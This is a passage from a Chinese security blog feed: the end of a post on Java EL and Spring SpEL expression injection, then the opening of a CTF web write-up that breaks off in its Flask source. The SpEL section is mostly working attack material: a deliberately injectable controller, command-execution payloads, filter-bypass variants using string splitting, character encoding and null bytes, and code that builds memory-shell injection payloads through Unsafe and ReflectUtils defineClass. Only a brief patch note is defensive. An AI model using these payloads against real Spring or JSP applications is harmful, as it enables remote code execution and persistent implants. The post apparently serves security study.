class="hljs-comment">//获取webRoot</span><br>$&#123;applicationScope&#125;<br><span class="hljs-comment">//执行命令</span><br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><p>主要还是通过反射的方式去命令执行，也可以利用ScriptEngine调用JS引擎绕过过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h2 id="SpEL-Attack"><a href="#SpEL-Attack" class="headerlink" title="SpEL-Attack"></a>SpEL-Attack</h2><p>SpEL：Spring Expression Language 一种表达式语言，支持在运行时查询和操作对象图，类似于EL表达式。</p><p>SpEL 的诞生是为了给 Spring 社区提供一种能够与Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。</p><p>SpEL基本语法： SpEL使用 <code>#&#123;...&#125;</code>作为定界符，大括号内被视为SpEL表达式，里面可以使用运算符，变量，调用方法等。使用 <code>T()</code> 运算符会调用类作用域的方法和常量，如<code>#&#123;T(java.lang.Math)&#125;</code>返回一个java.lang.Math类对象。</p><p><code>#&#123;&#125;</code>和<code>$&#123;&#125;</code>的区别：</p><ul><li><code>#&#123;&#125;</code> 用于执行SpEl表达式，并将内容赋值给属性</li><li><code>$&#123;&#125;</code> 主要用于加载外部属性文件中的值</li></ul><p>SpEL常用在三个地方。</p><ol><li><p>Value注解 （注：这个类要通过依赖注入才能使Value注解生效，直接new对象是不行的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo1.bean;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.PropertySource;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@PropertySource(&#123;&quot;classpath:/configure.properties&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.user.name&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String userName; <span class="hljs-comment">// 值来自application.properties</span><br>    <span class="hljs-meta">@Value(&quot;$&#123;home.dorm&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String address; <span class="hljs-comment">// 值来自configure.properties(放在resources文件夹下)</span><br>    <span class="hljs-meta">@Value(&quot;#&#123;T(java.lang.Math).random()&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> age;<br>    <span class="hljs-meta">@Value(&quot;#&#123;systemProperties[&#x27;os.name&#x27;]&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String sys; <span class="hljs-comment">// 注入操作系统属性</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// configure.properties</span><br>home.dorm=Room402,Unit4,Building3,No<span class="hljs-number">.34</span>.LousyLoad<br><span class="hljs-comment">// application.properti</span><br>spring.user.name=Taco<br></code></pre></td></tr></table></figure><p>输出如下： <code>User&#123;userName=&#39;Taco&#39;, address=&#39;Room402,Unit4,Building3,No.34.LousyLoad&#39;, age=0.5913714334107036, sys=&#39;Windows 10&#39;&#125;</code></p></li><li><p>XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Book&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.bean&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;表达式&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>Expression接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">spelTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello &#x27;+&#x27;SpEL&#x27;).concat(#end)&quot;</span>);<br>    <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);<br>    System.out.println(expression.getValue(context));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出<code>Hello SpEL!</code></p></li></ol><p>实际情况下，一般都是基于上面第三种SpEL的使用场景出现的漏洞。 下面简单分析一下SpEL在求表达式值的过程</p><blockquote><p>1.创建解析器 new SpelExpressionParser() 2.解析表达式 parseExpression(your_expression) 3.构造上下文 new StandardEvaluationContext() 默认为这个 4.求值 expression.getValue(context)</p></blockquote><h3 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h3><blockquote><p>1.服务器接收用户输入的表达式 2.表达式解析之后调用了getValue 3.使用StandardEvaluationContext作为上下文对象</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpELController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;spel&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(name=&quot;cmd&quot;)</span>String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello SpEL!!!&quot;</span>);<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(cmd);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> expression.getValue();<br>        <span class="hljs-keyword">return</span> obj.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中，可注入的点在请求参数cmd 访问<code>http://localhost:8080/spel?cmd=T(java.lang.Runtime).getRuntime().exec(%27calc%27)</code> 成功弹出计算器。</p><h3 id="注入tricks"><a href="#注入tricks" class="headerlink" title="注入tricks"></a>注入tricks</h3><p>一些trivial的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;caslc&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>命令执行带返回结果的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;whoami&quot;</span>).start().getInputStream())).readLine()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;xxx&quot;</span>).next()<br></code></pre></td></tr></table></figure><p>利用js引擎可以实现更加复杂的操作，如注入内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;js&#x27;).eval(\&quot;&quot;</span> + makeJsDefinedClass(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>, s) + <span class="hljs-string">&quot;\&quot;)&quot;</span>;<br>    System.out.println(cmd);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">makeJsDefinedClass</span><span class="hljs-params">(String classname, String encoded)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;var data = &#x27;&quot;</span> + encoded + <span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>        <span class="hljs-string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +<br>        <span class="hljs-string">&quot;var cls = java.lang.Class.forName(&#x27;sun.nio.ch.Util&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;var method = cls.getDeclaredMethod(&#x27;unsafe&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;method.setAccessible(true);&quot;</span> +<br>        <span class="hljs-string">&quot;var unsafe = method.invoke(cls);&quot;</span> +<br>        <span class="hljs-string">&quot;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();&quot;</span> +<br>        <span class="hljs-string">&quot;var evil = unsafe.defineClass(&#x27;&quot;</span> + classname + <span class="hljs-string">&quot;&#x27;, bytes, 0, bytes.length, classLoader, null);&quot;</span> +<br>        <span class="hljs-string">&quot;evil.newInstance();&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里利用的是<code>Unsafe</code>去<code>defineClass</code>加载字节码</p><p>实际上Spring框架中<code>org.springframework.cglib.core.ReflectUtils</code>就提供了一系列反射有关的方法，其中就包括了字节码加载<code>defineClass</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;EvilInterceptor&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><p>高版本JDK（&gt;&#x3D;9）引入了命名模块机制，<code>java.*</code>下的非公开变量和方法不能被其他模块直接访问，JDK11还只会提示warning，而在JDK17中会强制开启，直接报错</p><p>上面的payload执行后会报错</p><blockquote><p>java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not “opens java.lang” to unnamed module @635eaaf1</p></blockquote><p><img src="/2024/08/22/El-Spel/image-20240822154752676.png" alt="image-20240822154752676"></p><p><code>java.lang.ClassLoader#defineClass</code>不是公开方法，无法被其他模块访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;org.springframework.expression.EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;org.springframework.expression.EvilInterceptor&#x27;,T(java.util.Base64).getDecoder().decode(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(&#x27;org.springframework.expression.ExpressionParser&#x27;))&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>SimpleEvaluationContext</code>、<code>StandardEvaluationContext</code> 是 SpEL提供的两个 <code>EvaluationContext</code></p><p><code>SimpleEvaluationContext</code> 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用</p><p>用<code>SimpleEvaluationContext</code>替换默认的<code>StandardEvaluationContext</code>，就能有效防止恶意SpEL表达式的执行。</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>反射</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// 反射调用+字符串拼接，绕过正则过滤</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>字符编码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// String类动态生成字符</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>&#125;)).start()<br><span class="hljs-comment">// char转字符串，再字符串concat</span><br>T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)))<br></code></pre></td></tr></table></figure><p><strong>字符串拼接</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>JavaScript引擎</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;xxx&quot;</span>),)<br></code></pre></td></tr></table></figure><p><strong>绕过T( 过滤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//%00会被直接替换为空</span><br>T%<span class="hljs-number">00</span>(<span class="hljs-keyword">new</span>)<br></code></pre></td></tr></table></figure><p><strong>绕过getClass(过滤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&#x27;&#x27;</span>.getClass 替换为 <span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class<br><span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">14</span>].invoke(<span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">7</span>].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>使用Spring工具类，可打内存马</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反序列化</span><br>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;rO0AB...&#x27;</span>))<br><span class="hljs-comment">// 执行自定义类的静态代码块</span><br>T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;Singleton&#x27;</span>,T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;yv66vgAAADIAtQ....&#x27;</span>),T(org.springframework.util.ClassUtils).getDefaultClassLoader())<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf</a></p><p><a href="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection">https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</a><br><a href="http://www.cnblogs.com/bitterz/p/15206255.html">www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125941767?spm=1001.2014.3001.5501">Javaweb安全——表达式注入（EL+SpEL）-CSDN博客</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/spel">Spel Attack | Java (gitbook.io)</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/elattack">El Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>巅峰极客2024-初赛-web-部分wp</title>
    <link href="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>可惜。</p><p>不多说了，看看吧。</p><h2 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h2><p>审计一下源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, redirect, url_for, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> secrets<br><br><br>app = Flask(__name__)<br>app.secret_key = secrets.token_hex(<span class="hljs-number">16</span>)<br>working_id = []<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-built_in">id</span> = request.form[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">id</span>.isalnum() <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>) != <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;无效的ID&#x27;</span><br>        session[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-built_in">id</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>):<br>            os.popen(<span class="hljs-string">f&#x27;mkdir /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chown www-data /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chmod a+w /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;sandbox&#x27;</span>))<br>    <span 